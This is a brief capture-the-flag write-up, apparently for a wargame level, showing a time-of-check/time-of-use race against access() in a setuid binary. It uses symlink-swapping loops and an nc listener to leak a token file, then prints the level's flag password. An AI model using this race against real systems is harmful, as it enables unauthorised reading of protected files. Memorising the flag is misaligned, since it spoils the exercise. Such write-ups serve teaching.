@@ -1,0 +1,27 @@
+Running strings on the level10 binary outputs :
+
+%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 ..
+Unable to connect to host %s
+
+
+We notice that the binary tries to connect to a host on port 6969.
+
+Checking further used functions in the program indicates us that access() is used to check for permissions.
+
+It is possible to create a race condition in order to exploit the call to access and substitute the file we want to open.
+
+For the race condition to succeed we need to run two simultaneous shell commands:
+
+while true; do ln -fs ~/level10 /tmp/race; ln -fs ~/token /tmp/race; done
+
+while true; do ~/./level10 /tmp/race 127.0.0.1; done
+
+Last step is to listen on port 6969:
+
+nc -lk 6969
+
+Password for flag10 is :
+
+woupa2yuojeeaaed06riuj63c
